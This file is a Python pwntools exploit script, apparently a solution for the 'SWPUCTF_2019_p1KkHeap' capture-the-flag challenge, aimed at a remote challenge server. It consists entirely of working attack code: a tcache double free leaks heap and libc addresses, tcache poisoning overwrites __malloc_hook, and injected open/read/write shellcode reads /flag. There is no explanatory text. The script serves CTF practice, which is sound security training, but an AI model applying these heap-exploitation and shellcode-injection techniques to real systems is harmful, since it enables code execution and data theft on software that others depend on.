from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node1.anna.nssctf.cn",28176)
# io=process("./SWPUCTF_2019_p1KkHeap")
elf=ELF("./SWPUCTF_2019_p1KkHeap")
libc=ELF("./libc-2.27.so")

def add(s):
    io.sendlineafter(b"Choice: ",b"1")
    io.sendlineafter(b"size: ",str(s))

def show(n):
    io.sendlineafter(b"Choice: ",b"2")
    io.sendlineafter(b"id: ",str(n))
    
def edit(n,cc):
    io.sendlineafter(b"Choice: ",b"3")
    io.sendlineafter(b"id: ",str(n))
    io.sendafter(b"content: ",cc)

def delete(n):
    io.sendlineafter(b"Choice: ",b"4")
    io.sendlineafter(b"id: ",str(n))
    
# gdb.attach(io)
# pause()

mm_addr=0x66660100

add(0x100) #0
add(0x100) #1
delete(0)
delete(0)
show(0)
io.recvuntil(b"content: ")
heap_addr=u64(io.recv(6).ljust(8,b"\x00"))-0x260
print("heap_addr: "+hex(heap_addr))

add(0x100) #2
edit(2,p64(heap_addr+0x10)) 
add(0x100) #3
add(0x100) #4
edit(4,b"\x07"*0x40)
delete(0)
show(0)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-0x70-libc.sym[b"__malloc_hook"]
print("leak_addr: "+hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b"__malloc_hook"]
orw_shellcode=asm(shellcraft.open("/flag")+shellcraft.read(3,mm_addr+0x400,0x50)+shellcraft.write(1,mm_addr+0x400,0x50))

edit(4,b"\x07"*0x40+p64(0)*6+p64(malloc_hook)+p64(0)+p64(mm_addr))
add(0x90) #5
edit(5,orw_shellcode)
add(0x70) #6
edit(6,p64(mm_addr))

add(0x30)

io.interactive()